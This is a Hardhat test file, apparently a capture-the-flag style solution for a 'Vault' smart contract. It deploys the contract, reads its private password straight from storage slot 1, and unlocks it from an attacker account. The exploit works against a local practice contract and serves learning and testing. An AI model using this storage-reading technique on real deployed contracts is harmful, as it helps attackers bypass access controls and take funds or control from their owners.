const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Vault", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const ContractFactory = await ethers.getContractFactory("Vault")
    // ethers.encodeBytes32String
    const contract = await ContractFactory.connect(deployer).deploy(ethers.encodeBytes32String("Zard"))
    await contract.waitForDeployment()
    const contractAddress = await contract.getAddress()


    return { contract, attacker }
  }

  it("attack and check", async () => {
    const { attacker, contract } = await loadFixture(deployFallbackFixture)

    // 访问存储插槽
    const r = await ethers.provider.getStorage(await contract.getAddress(), 1)

    // 攻击
    const tx = await contract.connect(attacker).unlock(r)
    await tx.wait()

    //  断言
    expect(await contract.locked()).to.equal(false)

  })
})